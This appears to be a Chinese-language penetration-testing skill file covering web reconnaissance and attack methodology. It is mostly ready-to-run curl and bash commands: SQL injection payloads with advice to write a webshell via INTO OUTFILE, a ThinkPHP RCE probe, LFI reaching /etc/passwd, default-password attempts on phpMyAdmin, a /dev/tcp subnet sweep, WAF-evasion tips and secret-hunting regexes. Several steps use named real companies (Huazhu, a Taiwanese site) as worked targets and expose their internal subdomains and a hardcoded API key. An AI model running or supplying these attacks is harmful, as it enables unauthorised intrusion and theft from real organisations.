# - iss (issuer): 系统开发商身份
# - sub (subject): 设备/用户标识（MD5/hex）
# - iat/exp: 签发/过期时间，判断有效期
# - alg: HS256 需要爆破签名密钥
```

### 6a. Next.js `__NEXT_DATA__` Runtime Config Extraction（高价值被动收集）

Next.js SSR 页面在 `__NEXT_DATA__` JSON 中暴露完整的 `runtimeConfig`，其中常包含**内网 API 端点、内部域名、CDN 前缀、App ID**等敏感信息。

```bash
# 从任意 SSR 页面提取 runtimeConfig
curl -sL "https://target.com" | grep -oP '"runtimeConfig":\{[^}]+\}' | python3 -c "
import sys,json
raw=sys.stdin.read().strip()
if raw:
    data=json.loads('{' + raw + '}')
    rc=data.get('runtimeConfig',{})
    for k,v in rc.items():
        print(f'{k} => {v}')
"
```

**重点关注字段：**
| 字段 | 泄露内容 | 价值 |
|------|---------|------|
| `api`, `apiHZ`, `baseUrl` | 后端 API 地址 | ⭐⭐⭐ 直接暴露真实 API 端点 |
| `assetPrefix` | CDN 资源路径 | ⭐⭐ 暴露 CDN 域名和目录结构 |
| `loginUrl`, `logoutApi` | 认证中心地址 | ⭐⭐ 暴露 SSO/OAuth 端点 |
| `wxAppId`, `wxAppSecret` | 微信 App ID | ⭐⭐ 用于微信 OAuth 流程 |
| `hudId`, `appId`, `env` | 内部标识符 | ⭐ 用于请求伪造/参数构造 |
| 任何 URL 格式的值 | 隐藏子域名 | ⭐⭐⭐ 非公开域名 |

**多端点对比技巧：** 对比 PC 版和移动版 `__NEXT_DATA__`，可能发现不同的 API 端点或额外的配置项。
```bash
# PC vs 移动端对比（发现移动端独有的字段）
diff <(curl -sL "https://www.hworld.com" | grep -oP 'runtimeConfig[^}]+') \
     <(curl -sL "https://m.hworld.com" | grep -oP 'runtimeConfig[^}]+')
```

### 6b. Chinese Enterprise Server Fingerprinting

中国企业级系统常用特定中间件/网关，识别后可直接锁定攻击面：

| Server Header | 常见场景 | 攻击面 |
|--------------|---------|--------|
| **Tengine** | 阿里系（淘宝/蚂蚁/华住/携程） | 路径穿越、畸形请求绕过 |
| **APISIX** | 云原生 API 网关 | 默认 key 泄露、路由绕过 |
| **tencent-cos** | 腾讯云对象存储 | 桶配置泄露、敏感文件 |
| **CE_C / CE_E** | 华住内部服务代号 | 非标服务，需进一步探测 |
| **TGW** (Tencent Gateway) | 腾讯云负载均衡 | WAF 绕过（header 注入） |

```bash
# 快速 Server 指纹识别
curl -skI "https://target.com" | grep -i "^server:"

# APISIX 路由绕过测试
curl -sk "https://target.com/../actuator" -H "X-Forwarded-Host: internal"
curl -sk "https://target.com/..;/actuator/health"

# Tencent COS 桶遍历测试
curl -sk "https://cdn.example.com/" -o /dev/null -w "HTTP:%{http_code} Server:%{server}\\n"
# 如果 Server 返回 tencent-cos → 可能开启了公开桶
```

### 6c. 501 状态码 — 隐藏端点的指示器

Spring Boot actuator、Swagger UI 等端点被 API 网关显式拒绝时返回 **501 Not Implemented**（而非 404 或 403）。这是高价值信号——端点**存在但被网关拦截**。

```bash
# 探测隐藏端点（501 表示存在但被拦截）
for path in /actuator /swagger-resources /v2/api-docs /api-docs; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target-cmsapi.com${path}")
  echo "${path}: ${code}"
done

# 501 → 端点被网关显式拒绝，可尝试绕过：
# 1. 添加/修改 Header：X-Forwarded-For, X-Real-IP, Host
# 2. URL 编码/大小写混淆
# 3. 尾随路径（/actuator;swagger 或 /actuator/..;/swagger）
# 4. 通过同一服务的其他端口访问
```

### 6d. CORS 通配符检测

`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` 同时存在是严重配置缺陷。

```bash
# 使用自定义 Origin 测试
curl -skI "https://api.target.com" -H "Origin: https://evil.com"
# 检查响应头：
# access-control-allow-origin: https://evil.com             ← ❌ 反射 Origin
# access-control-allow-credentials: true                    ← ❌ 跨域凭据
# access-control-allow-methods: POST, GET, PUT, OPTIONS     ← 允许所有方法
# access-control-allow-headers: Content-Type,token,...      ← 允许自定义认证 Header

# 检测结果：
# 1. wildcard + credentials = true → 指定 Origin 的凭据跨域（严重）
# 2. 暴露自定义认证 Header（sid, sk, token, User-Token） → 可构造 CSRF 攻击
# 3. 有 XDomainRequestAllowed: 1 → 旧版 IE 跨域请求支持
```

### 6e. JS Chunk 文件中的隐藏子域名提取

Vue/React 打包后的 chunk JS 文件中常包含**非公开发布的子域名**（不在 crt.sh、Quake 等公开记录中）。

```bash
# 从 JS 中提取所有 http/https URL
curl -sL "https://franchise.huazhu.com/js/chunk-vendors.xxx.js" | \
  grep -oP 'https?://[^"'"'"' )]+' | sort -u

# 实际案例（从 franchise 系统的 JS 中提取）：
# https://franchise-cmsapi.huazhu.com    ← CMS API（未公开）
# https://franchise-out.huazhu.com      ← 外部 API（未公开）
# https://duhu.huazhu.com               ← 内部系统（未公开）
# https://franchise.huazhu.com          ← 主站（已知）

# 另一个常见来源：高德地图 API Key 硬编码
# https://restapi.amap.com/v3/place/text?key=6ebf98a4368fca69ac36c5769cda5052
# → 此 Key 可用于查询调用配额、使用统计
```

### 6f. Empty POST Auth Barrier 测试

后端 API 返回结构化 JSON 错误（code: 603, "对不起，你没有登录！"）说明端点**真实存在**且有统一的认证层。此时应测试不同的认证方式：

```bash
# 空 POST 确认 API 存活
curl -sk -X POST "https://api.target.com/api/login" \
  -H "Content-Type: application/json" -d '{}'

# 尝试各种认证头
for hdr in \
  "sid: 1" \
  "sk: 1" \
  "token: test" \
  "Authorization: Bearer test" \
  "Cookie: sid=1" \
  "User-Token: test" \
  "Client-Platform: web"
do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "$hdr" "https://api.target.com/api/user/info")
  echo "${hdr}: ${code}"
done
# 200/302 → 找到了有效的认证方式
# 603/401 → 需要真实凭据
```

### 6h. 多级子域名发现链（层级递进技术）

不同技术发现不同层级的子域名。不要只依赖 crt.sh 或 Quake 一种方法。

```
层级 1: 公开子域名     crt.sh, Quake, Subfinder    → jira.huazhu.com, adfs.huazhu.com
层级 2: JS 源码隐藏    chunk JS grep URL            → franchise-cmsapi.huazhu.com, duhu.huazhu.com
层级 3: 非标 TLD       __NEXT_DATA__ runtimeConfig  → ows-nofficial.huazhuidc.com
层级 4: 其他系统       响应头/Server/404 body        → hmeeting.huazhu.com, exp-e.huazhu.com
```

```bash
# ==== 层级 1: 公开来源 ====
# crt.sh 先跑
curl -s "https://crt.sh/?q=%25.huazhu.com&output=json" | \
  python3 -c "import sys,json;d=json.load(sys.stdin);[print(n) for n in sorted({e for i in d for e in i['name_value'].split('\\n') if '*' not in e and e.strip()})]"

# ==== 层级 2: JS 源码 ====
# 从主站加载的所有 JS 中提取 URL，特别关注非标准域名
curl -sL "https://target.com" | grep -oP 'src="[^"]+\.js"' | sed 's/src="//;s/"//' | \
  while read js; do curl -sL "$js" 2>/dev/null; done | grep -oP 'https?://[a-z0-9.-]+\.[a-z]+' | sort -u

# ==== 层级 3: Next.js __NEXT_DATA__ ====
# 搜索非标准 TLD（不是 .com/.cn 的域名）
curl -sL "https://target.com" | grep -oP 'https?://[a-z0-9.-]+\.[a-z]{2,}' | sort -u

# ==== 层级 4: 从已有发现推导 ====
# 已知 login.huazhu.com，试 auth.huazhu.com, api.huazhu.com
# 已知 franchise.huazhu.com，试 franchise-cmsapi, franchise-out
```

**实际案例（华住）：**
```
crt.sh → huazhu.com 找到 21 个公开子域名（含 jira/adfs/sunlogin/sslvpn）
JS 源码 → franchise JS 暴露 franchise-cmsapi/franchise-out/duhu（不在 crt.sh 中）
__NEXT_DATA__ → huazhuidc.com 非标域名（ows-nofficial 后端 API）
多端口探测 → 8080 FRP Dashboard、7758 FRP 流量端口（不在公开记录中）
```

---

## 自动化扫描与验证

当请求返回 "HTTP/1.1 200 Connection established" 但**无响应体或 body 为空**时，说明该主机存在但被公司防火墙/代理限制为仅内网访问。这种模式本身是一种信息泄露——暴露了**内部网络拓扑**。

```bash
# 检测模式
curl -skI --connect-timeout 5 "https://jira.huazhu.com" | head -10
# HTTP/1.1 200 Connection established
# （无更多响应头/内容）→ 内网资产

# 已发现的常见内网资产类型：
# - jira.domain.com     → JIRA 项目管理
# - sslvpn.domain.com   → SSL VPN 入口
# - adfs.domain.com     → AD Federation Services
# - sunlogin.domain.com → 向日葵远程控制（有 RCE 历史）
# - wafwl.domain.com    → WAF 白名单管理
# - aiot.domain.com     → IoT 管理平台
# - *.int.domain.com    → 开发/测试环境

# 尝试 HTTP 代替 HTTPS（有时内网资产只配了 HTTP）
curl -skI --connect-timeout 5 "http://jira.huazhu.com"
```

---

### 7. API 认证机制探测流程

```bash
# 1. 找到真实 API 前缀（对比 SPA fallback）
for prefix in /api /v1 /system /bio_platform /admin /manage; do
  size=$(curl -s -k -o /dev/null -w "%{size_download}" --connect-timeout 3 \
    "https://target.com${prefix}/auth/login" 2>/dev/null)
  echo "$prefix: $size bytes"
done
# 与首页 size 不同的 → 真实 API

# 2. 确认后端类型（Spring Boot → JSON 格式 404）
curl -s -k --connect-timeout 3 https://target.com/bio_platform/actuator/health
# Spring Boot 404 格式: {"timestamp":"...","status":404,"error":"Not Found","path":"..."}

# 3. 认证方式枚举
# a) 免认证 API
for ep in /user /visitor /config /info /health /version /status; do
  curl -s -k -o /dev/null -w "%{http_code}" --connect-timeout 3 \
    "https://target.com/api${ep}"
done

# b) 硬编码 token 认证
# 从 config.js 或 JS 中提取的 token
for hdr in "Authorization: Bearer <token>" "Token: <token>" "X-Token: <token>"; do
  curl -s -k -H "$hdr" https://target.com/api/user/info
done

# c) 登录后获取 token 认证
curl -s -k -X POST https://target.com/api/auth/login \
  -d '{"username":"admin","password":"admin123"}'
```

### 8. SPA Fallback 识别（常见陷阱）

Vue.js/React SPA 常配置 `try_files $uri /index.html`，导致所有未匹配路径返回 index.html（200 OK），**掩盖了真实 endpoint 的状态**。

**检测方法：**
```bash
# 方法1：对比响应体大小
# 先获取 SPA 首页大小作为基准
curl -s -o /dev/null -w "首页: %{size_download} bytes\n" https://target.com/
# 检查可疑端点，如果 size 都与首页相同 -> SPA fallback
for path in /actuator /actuator/health /druid/ /swagger-ui.html; do
  curl -s -k -o /dev/null -w "$path -> %{size_download} bytes | %{content_type}\n" --connect-timeout 3 "https://target.com$path"
done

# 方法2：用 Accept: application/json 区分
# 真实 REST API 返回 JSON，SPA fallback 仍返回 text/html
curl -s -k -H "Accept: application/json" -o /dev/null -w "HTTP:%{http_code} Type:%{content_type}\n" https://target.com/actuator/health

# 方法3：找真实 API 前缀（SPA 通过 nginx 反代到后端）
# 尝试常见前缀看哪个返回 JSON 格式的 404（而非 HTML）
for prefix in /api /v1 /system /bio_platform /admin /manage; do
  curl -s -k -o /dev/null -w "$prefix/actuator/health -> %{http_code}|%{content_type}\n" --connect-timeout 3 "https://target.com${prefix}/actuator/health"
done
# 真实后端返回 JSON 404/401，SPA 返回 text/html 200
```

### 9. 同主机多端口探测

安防/人脸识别/门禁系统常在同一主机上运行多个端口，每个端口是独立的 Web 应用（不同后端）。

```bash
# 同一 IP 不同端口可能运行完全不同的系统
# 典型场景：安防设备
#   :9520  → 访客预约系统 (Vue SPA, 4427B)
#   :9526  → 人像采集系统 (Vue SPA, 1228B) ← 不同大小的 index.html

# 检测方法
# 1. 用 dddd 扫描发现开放的非标端口
dddd -t target.com -p 1-65535

# 2. 每个端口都做完整路径枚举（不要只查主端口）
for port in 9520 9526; do
  echo "=== Port $port ==="
  curl -s -k -o /dev/null -w "HTTP:%{http_code} Size:%{size_download}\\n" --connect-timeout 5 "https://target.com:$port/"
  curl -s -k --connect-timeout 3 "https://target.com:$port/config.js" 2>/dev/null | head -5
  curl -s -k --connect-timeout 3 "https://target.com:$port/" | grep -oP '<title>[^<]+</title>'
done

# 3. 检查 config.js 看两个端口是否共享同一后端
#    不同端口可能指向不同的 Spring Boot 后端路径
#    :9520 → /bio_platform/
#    :9526 → /bio_platform/ (同一路径前缀但不同认证域)
```

### 10. Web Reconnaissance

```bash
# HTTP headers
curl -I https://target.com

# robots.txt and sitemap
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml

# SSL certificate info
openssl s_client -connect target.com:443 -servername target.com 2>/dev/null | openssl x509 -text -noout
```

### 11. FRP (Fast Reverse Proxy) 服务器识别

检测到 Vue 3 SPA 管理后台 + 非标 TLS 端口组合时，排查是否为 FRP 服务器。

**快速判断清单：**

```bash
# 1. 检查 cookie 名称
curl -sk -X POST "http://target:8080/api/auth/logout" -v 2>&1 | grep Set-Cookie
# frp_mgr_session=  → ✅ FRP

# 2. 检查 API 端点是否存在
curl -sk "http://target:8080/api/keys" -o /dev/null -w "%{http_code}"
# → 401 表示端点存在（FRP），404 表示其他系统

# 3. 检查白名单端点
curl -sk "http://target:8080/api/whitelist" -o /dev/null -w "%{http_code}"
# → 401 表示 FRP

# 4. 检查 7758 是否开放且走 TLS
timeout 3 openssl s_client -connect target:7758 -quiet 2>/dev/null | head -3
# → 接受 TLS 握手但不响应 HTTP → FRP 流量端口

# 5. 检查同网段其他 IP 是否有相同服务
for i in $(seq 0 255); do
  timeout 2 bash -c "echo -n '' > /dev/tcp/$base_ip.$i/8080" 2>/dev/null && echo "$i"
done
# FRP 常以多节点集群部署，相邻 IP 可能为同类节点
```

**详细方法论与爆破脚本：** `references/frp-server-recon.md` + `scripts/frp_brute.py` + `scripts/frp_dict_gen.py`

---

### 12. Web 指纹识别

```bash
# 单目标指纹扫描（显示详细匹配信息）
python3 ~/.hermes/skills/cybersecurity/info-gathering/scripts/web_fingerprint.py https://target.com -v

# 批量扫描
python3 ~/.hermes/skills/cybersecurity/info-gathering/scripts/web_fingerprint.py -t targets.txt --threads 10 -o results.json

# 输出 JSON 格式
python3 ~/.hermes/skills/cybersecurity/info-gathering/scripts/web_fingerprint.py https://target.com -o result.json
```

### 13. SQL Injection Testing（Active Recon 阶段）

在主动侦察阶段，对发现的参数进行基本的 SQL 注入测试：

```bash
# 1. 错误回显测试（单引号闭包）
curl -sL --max-time 10 "http://target/page.php?id=12'"

# 2. 布尔注入（and 1=1 vs and 1=2 — 对比页面大小差异）
curl -sL --max-time 10 -o /dev/null -w "%{size_download}" "http://target/page.php?id=12%20and%201=1"
curl -sL --max-time 10 -o /dev/null -w "%{size_download}" "http://target/page.php?id=12%20and%201=2"

# 3. 302 重定向作为 SQL 错误指示器
# 某些应用不显示 SQL 错误，而是重定向到 error.php
curl -vL --max-time 10 "http://target/page.php?id=12%20and%201=1" 2>&1 | grep -i location
# 若出现: Location: error.php?msg=資料讀取有誤 → SQL 执行出错 → 确认有注入点

# 4. 字符串型注入（参数被引号包裹的情况）
curl -sL --max-time 10 "http://target/page.php?id=12%27%20OR%20%271%27%3D%271%27%20--%20-"

# 5. 运算等价测试（判断是数字型还是字符串型）
# id=12 成功 + id=13-1 也成功 → 数字型，可能可注入
# id=12 成功 + id=13-1 失败 → 字符串型（参数被引号包裹）
curl -sL --max-time 10 "http://target/page.php?id=12-0"
curl -sL --max-time 10 "http://target/page.php?id=13-1"

# 6. 响应分析：不同 payload 的 title/size 差异
# 正常页面 title 含内容标题；失败时 title 为空（" | SiteName"）
curl -sL --max-time 10 "http://target/page.php?id=12" | grep -oP '<title>[^<]*</title>'
curl -sL --max-time 10 "http://target/page.php?id=99999" | grep -oP '<title>[^<]*</title>'
```

**注入判断速查表：**
| 模式 | 含义 |
|------|------|
| 302 重定向到 error.php | **不一定是 SQL 注入！** 需二次确认。可能是 PHP `ctype_digit()` 或正则 `/^\d+$/` 校验拦截（非数字字符直接跳错误页）。 |
| id=12 有内容, id=12' 无内容 | 引号破坏查询结构 |
| id=13-1 返回空 != id=12 | 参数被当作字符串而非数字（13-1 作为整体字符串比较，无匹配记录） |
| id=12 and 1=1 返回空（应有内容） | 查询结构被破坏或WAF拦截，或输入校验拦截 |
| 415/403 响应 | WAF 或反爬触发 |

**⚠️ ctype_digit() 假阳性陷阱：** `id=12 and 1=1` 触发的 302 重定向**不等于** SQL 注入。当 PHP 使用 `ctype_digit($_GET['id'])` 或 `preg_match('/^\\d+$/', $id)` 校验时，任何非数字字符都会导致 `and 1=1` 被整体当作非法输入拦截，不是 SQL 执行出错。验证方法：

**⚠️ 注入确认但页面抑制输出（常见于定制 PHP 系统）：**
有时 `--` 注释能改变 SQL 查询结果（如面包屑从 `PEEK` 变为 `全部產品`），证明注入存在，但所有 UNION SELECT、布尔盲注、报错注入都返回**同一回退页面**（如"全部產品"页 21876B vs 正常单品页 19600B）。这意味着：

1. 应用在检测到 SQL 结果异常或错误时统一回退到默认视图
2. 错误抑制（`@` 或 `error_reporting(0)`）导致 SQL 错误不可见
3. 页面逻辑是「SQL 结果正常 → 显示单品 / SQL 异常 → 显示全部」

**这种情况下无法通过常规注入提取数据，包括：**
- UNION SELECT（列数不匹配或返回多行 → 回退）
- 布尔盲注（TRUE/FALSE 都触发回退，无差异）
- 报错注入（EXTRACTVALUE/UPDATEXML）
- 时间盲注（SLEEP/BENCHMARK 在查询执行前已被校验拦截）

**应对策略：**
- 确认注入存在后尝试 `INTO OUTFILE`/`INTO DUMPFILE` 写 webshell（需 FILE 权限）
- 通过 `test.php` 或 PHP 错误泄露确认数据库类型（MySQL vs MSSQL）
- 检查是否有独立的 phpMyAdmin 或管理面板存在
- 转向其他参数或端点测试（同一站点不同功能可能无校验）
```bash
# 如果 id=12.5 或 id=12-0 返回空（而非与 id=12 相同内容）
# → 参数被整体当作字符串，不是数字上下文 → ctype_digit 校验可能性高
curl -sL --max-time 10 "http://target/page.php?id=12.5"
curl -sL --max-time 10 "http://target/page.php?id=12-0"
# 若两者都返回空页（与 id=12 不同）→ 参数校验严格，非注入点
```

### 14. Legacy PHP Application Assessment（台湾 .com.tw 站点模式）

台湾企业网站常使用定制 PHP 系统，Apache 2.2 + PHP 5.x + MySQL 5.x 仍很常见。评估方法论：

**a) 服务器版本指纹确认：**
```bash
# 从响应头获取版本（不加密的 HTTP 方便探测）
curl -sI --max-time 10 "http://target.com/" | grep -i "server\|x-powered-by\|apache\|php"
# Apache/2.2.8 (Win32) PHP/5.2.6 → 2008 年版本，大量已知漏洞
# Apache/2.2.x + PHP/5.x → 目录列表默认开启（AllowOverride 未配置）
```

**b) 目录列表扫描（Apache 2.2 默认漏洞）：**
```bash
# 检查目录列表是否开启
curl -sL --max-time 10 "http://target.com/Connections/" | grep -i "Index of"
# 若返回文件列表 → 信息泄露

# 关注的目录名：
# - admin/, manager/, backup/, db_admin/
# - Connections/, includes/, config/
# - uploads/, files/, download/
# - phpMyAdmin_, phpmyadmin, pma/
# - _private/, _vti_bin/ (FrontPage 扩展)
```

**c) 关键 PHP 文件枚举（从目录列表获取后直接访问）：**
```bash
# 数据库凭证文件（PHP 执行后无输出，但目录列表暴露其存在）
# db_config.php, mysql_connect.php, config.php, connect.php

# 触发 PHP 错误泄露路径（访问时依赖缺失的文件）
curl -sL --max-time 10 "http://target.com/Connections/check_login.php"
# Warning: include(Connections/mysql_connect.php): failed to open stream
# in C:\NewMaingchau-web\MCpersonnel\...\check_login.php on line 5
# → 泄露完整服务器路径、PHP include_path、行号
```

**d) phpMyAdmin 发现与利用：**
```bash
# 扫描 phpMyAdmin 路径
for path in phpMyAdmin_ phpMyAdmin phpmyadmin pma admin/phpmyadmin; do
  curl -sL --max-time 5 -o /dev/null -w "%{http_code}" "http://target.com/$path/"
done

# phpMyAdmin 版本识别
curl -sL --max-time 10 "http://target.com/phpMyAdmin_/" | grep -oP 'phpMyAdmin [0-9.]+'

# HTTP Basic Auth 默认密码尝试
for creds in "pma:" "root:" "admin:" "mysql:" "pmauser:"; do
  user=$(echo $creds | cut -d: -f1)
  pass=$(echo $creds | cut -d: -f2)
  code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" -u "$user:$pass" "http://target.com/phpMyAdmin_/")
  echo "$user:$pass -> HTTP $code"
done

# 登录后提取 MySQL 信息
curl -s --max-time 10 -u "pma:" "http://target.com/phpMyAdmin_/main.php?server=1" | \
  grep -oP 'Server version:[^<]+|User: [^<]+|MySQL client version:[^<]+'

# 登录后列出数据库（受限用户可能仅 information_schema）
curl -s --max-time 10 -u "pma:" -b /tmp/pmacookies.txt \
  "http://target.com/phpMyAdmin_/sql.php?server=1&is_js_confirmed=1" \
  -d "sql_query=SHOW+DATABASES" | grep -oP '(?<=<td class="value">)[^<]+'
```

**⚠️ phpMyAdmin 权限限制：** `pma:` 空密码在 phpMyAdmin 2.10.3 上可通过 HTTP Basic Auth，但 MySQL 用户 `pma@localhost` 通常只有 `information_schema` 权限，无 `mysql.user` 或业务数据表权限。此时：
- 可用 phpMyAdmin 做服务端版本探测（MySQL 5.0.51b 等）
- 尝试 LOAD_FILE() 读文件（需 FILE 权限，pma 通常无此权限）
- 尝试通过 SQL 注入或已知 phpMyAdmin CVE 提权

**e) 验证码漏洞（常见于定制 PHP 系统）：**
```html
<!-- 验证码值硬编码在 HTML 中，前端验证即可绕过 -->
<input name="recaptcha" type="hidden" id="recaptcha" value="083">
```
登录页面 HTML 中搜索 `hidden` + `value` 看验证码是否在前端暴露。验证码值每次刷新变化（由服务端生成），但作为 hidden 字段暴露在前端，POST 时服务端仅对比此值，无真正图形验证码验证。本质是「前端 token 验证」而非「图形验证码验证」。

**f) $lang 参数 LFI 测试（常见误区）：**
台湾定制 PHP 系统常用 `?$lang=en` 切换语言。**不要默认假定这是 `include()` 的文件包含点。** 实际实现可能是 `switch($lang)` 或简单字符串替换数组：
```php
// 可能实现1: include (较少见)
// $lang = $_GET['$lang']; include("lang/{$lang}.php");

// 可能实现2: switch (常见)
// switch($_GET['$lang']) { case 'en': $title='Login'; break; case 'cn': $title='登入'; break; }

// 可能实现3: 数组映射 (最常见)
// $strings = ['en' => ['title'=>'Login'], 'cn' => ['title'=>'登入']];
// $text = $strings[$_GET['$lang']] ?? $strings['cn'];
```

**验证方法：**
```bash
# 1. 先确认 $lang 是否真的影响页面（差异应该很小，仅 UI 文字不同）
diff <(curl -sL "http://target/page.php?%24lang=en") <(curl -sL "http://target/page.php?%24lang=cn")

# 2. 测试 PHP filter wrapper（如果页面大小不变 → 非 include）
curl -sL "http://target/page.php?%24lang=php://filter/convert.base64-encode/resource=index" | wc -c

# 3. 测试 null byte 截断（PHP 5.2.x 有效）
curl -sL "http://target/page.php?%24lang=../../etc/passwd%00" | wc -c

# 4. 所有尝试返回相同大小 → 非 include，放弃 LFI 尝试
```

**g) MSSQL vs MySQL 后端判断：**
phpMyAdmin 的存在不代表整个应用使用 MySQL。许多台湾企业 PHP 系统使用 MSSQL 后端，phpMyAdmin 是独立的 MySQL 管理工具。
```bash
# 方法1: test.php 抛出 MSSQL 错误
curl -sL "http://target/test.php"
# 若有 → Fatal error: Call to undefined function mssql_connection()
# → 系统使用 MSSQL（非 MySQL）

# 方法2: 查看 Connections/ 目录下是否有 mssql 相关文件
curl -sL "http://target/Connections/" | grep -i mssql

# 方法3: phpMyAdmin 中查到的 MySQL 版本和数据库信息 ≠ 业务系统数据库
# mysql.user 仅显示 phpMyAdmin 的配置用户，非业务数据库凭证
```

**h) PHP Path Disclosure 利用链：**
通过触发 include 错误泄露的服务器路径可直接用于：
1. `LOAD_FILE()` 尝试读取源码（需 MySQL FILE 权限）
2. LFI 确认路径深度
3. 确认操作系统类型（Win32 vs Linux）和 PHP 版本
4. 确认应用文件目录结构

### 15. 反爬/WAF 检测

侦察过程中触发保护机制时，识别保护类型：

```bash
# 1. JS Challenge 页面（自定义反爬）
# 特征：Title = "One moment, please..." / "请稍候…"
#       <script>setTimeout(function(){window.location.reload();}, 5000);</script>
#       无 Cloudflare/challenge-script/cf-turnstile 标记
# 原因：请求频率过高触发服务器端保护
# 应对：等待 60 秒，使用浏览器 User-Agent，降低频率

# 2. 415 Unsupported Media Type 突然出现
# 原因：服务器端限流/安全模块触发
# 应对：添加 Accept: text/html 头，换用 Python/urllib（不同 TLS 指纹）

# 3. 403 Forbidden 特定关键词
# sleep(), BENCHMARK(), UNION SELECT → 403
# 原因：WAF/mod_security 阻断已知攻击 payload
# 应对：使用等价替代（OR 1=1 → OR 2>1），分块编码
```

### 16. 服务器 Path Disclosure（通过 PHP 错误泄露）

```bash
# 访问依赖外部文件的 PHP 页面，触发 include 错误
curl -sL --max-time 10 "http://target.com/path/to/check_login.php"
# 输出示例:
# Warning: include(Connections/mysql_connect.php): failed to open stream
# in C:\\NewMaingchau-web\\MCpersonnel\\NewWeb\\Connections\\check_login.php on line 5
# → 泄露: 完整文件路径, include_path, PHP 版本, Windows/Linux, 目录结构

# 此信息可直接用于：
# - LOAD_FILE() 尝试读取源码（MySQL FILE 权限）
# - LFI 确认路径结构
# - 确认操作系统类型（区分 Win32 与 Linux）
```

### 17. 被动检测规则（YAKIT 流量嗅探模式）

基于 YAKIT 59 条流量检测规则整理 + 53 条扩展规则（总计 113 条）。用于对 HTTP 请求/响应做自动化被动嗅探，实时标记异常。

**参考文件：**
- `references/passive-detection-patterns.md` — 结构化整理（按凭证/攻击面/技术栈/信息泄露分类，每条带 curl 命令）
- `references/yakit-traffic-rules.json` — 原始 59 条 + 53 条新规则（Index 1-113，可直接导入 YAKIT）

**快速使用（渗透中）：**
```bash
# 响应中搜索凭据
curl -sk "https://target.com/api/..." | grep -oP '(?i)(access[-_]?(key|secret|id|token)|secret[-_]?(key|id))'

# 响应中搜索 GitHub Token
curl -sk "https://target.com/.env" | grep -oP '(ghp|ghu)_[a-zA-Z0-9]{36}'

# 响应中搜索云平台密钥
curl -sk "https://target.com/config.js" | grep -oP 'LTAI[a-z0-9]{12,20}'
curl -sk "https://target.com/" | grep -oP '(?i)(AKID[a-zA-Z0-9]{15,40})'

# 响应中搜索数据库连接串
curl -sk "https://target.com/backup.sql" | grep -oP '(?i)(mongodb(\+srv)?://[a-zA-Z0-9._%:***@-]+|postgresql://[a-zA-Z0-9._%:***@-]+|redis://[:***@-]+)'

# 响应中搜索 Webhook
curl -sk "https://target.com/robots.txt" | grep -oP '(open\.feishu\.cn/open-apis/bot/v2/hook/|oapi\.dingtalk\.com/robot/send\?access_token=|qyapi\.weixin\.qq\.com/cgi-bin/webhook/send\?key=)'

# 检测 CORS 通配符+凭据
curl -skI "https://api.target.com" -H "Origin: https://evil.com" 2>&1 | grep -i 'access-control-allow-origin:\s*\*' && curl -skI "https://api.target.com" -H "Origin: https://evil.com" 2>&1 | grep -i 'access-control-allow-credentials:\s*true'

# 检测 Stacktrace
curl -sk "https://target.com/error" | grep -oP '(Exception|Error|Traceback|Stack trace|at\s+[a-zA-Z_]+\.[\w\.]+\([\w\.]+:\d+\))'

# 检测 Fastjson
curl -sk "https://target.com/api" -d '{"test":"x"}' -H "Content-Type: application/json" | grep -oP '@type|com\.alibaba\.fastjson'

# 检测 GraphQL
curl -sk "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' | head -20

**覆盖的指纹类型（按严重度）：**

| 严重度 | 类型 | 示例 |
|--------|------|------|
| 🔴 CRITICAL | SQL错误/凭据泄露/Git泄露/Actuator暴露 | `jdbc:mysql://`, `.git/HEAD`, `SQL syntax`, `{"_links":...}` |
| 🟠 HIGH | 框架识别/API文档/管理后台/OA系统 | Spring Boot (`Whitelabel Error Page`), ThinkPHP, Laravel, 芋道Yudao, Swagger, Druid, 通达/泛微/致远OA, WebLogic, Jenkins, Nacos |
| 🟡 MEDIUM | Web服务器/前端框架/CMS/监控 | Nginx, Vue.js, React, WordPress, Django, Flask, Zabbix, Grafana, 宝塔面板, JumpServer, FineReport (ReportServer) |
| 🟢 LOW | 编程语言/UI组件 | PHP, Java, Element UI, Ant Design |

**检测方法：**
- **Header 匹配**：`Server`, `X-Powered-By`, `Set-Cookie` 等响应头
- **Body 匹配**：响应体中的特征字符串/正则
- **Cookie 匹配**：`JSESSIONID`, `laravel_session`, `rememberMe=deleteMe` 等
- **路径探测**：访问 `/actuator`, `/swagger-ui.html`, `/druid/index.html`, `/.git/HEAD` 等敏感路径，仅对 2xx 响应做 body 匹配（避免 404 页面误报）

**识别到框架后，按需手动探测：**

```bash
# Spring Boot → 探测 actuator
curl -s https://target.com/actuator/env | head -50
curl -s https://target.com/actuator/heapdump -o heapdump.hprof

# ThinkPHP → 探测 RCE
curl -s "https://target.com/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

# Laravel → 探测 .env 和 Ignition
curl -s https://target.com/.env | grep -E "APP_KEY|DB_PASSWORD"
curl -s https://target.com/telescope

# 芋道 Yudao → 探测接口未授权
curl -s https://target.com/admin-api/system/user/page
curl -s https://target.com/admin-api/infra/file/upload

# Git 泄露 → 还原源码
git-dumper https://target.com/.git/ ./dump

# Druid 监控
curl -s https://target.com/druid/datasource.json

# Swagger API 文档
curl -s https://target.com/v2/api-docs | python3 -m json.tool
```

## 资产探活（Liveness Check）

信息收集完成后必须进行探活，确认哪些资产实际存活。探活数据以 Quake 最新扫描记录为准。

### Quake API 探活（推荐）

Quake 返回的数据本身就是最近一次扫描确认存活的服务，可直接作为探活依据：

```bash
curl -s --connect-timeout 15 -X POST "https://quake.360.net/api/v3/search/quake_service" \
  -H "Content-Type: application/json" \
  -H "X-QuakeToken: <YOUR_TOKEN>" \
  -d '{"query": "domain: <target>", "start": 0, "size": 100}' | python3 -c "
import sys,json
d=json.load(sys.stdin)
for item in d.get('data',[]):
    host = item.get('service',{}).get('http',{}).get('host','')
    port = item.get('port','')
    title = item.get('service',{}).get('http',{}).get('title','无标题')
    server = item.get('service',{}).get('http',{}).get('server','无')
    name = item.get('service',{}).get('name','')
    print(f'{host}:{port} | {title} | Server: {server} | {name}')
"
```

### 探活输出格式

探活结果按「域名 | 系统名称 | 指纹」格式输出：

```
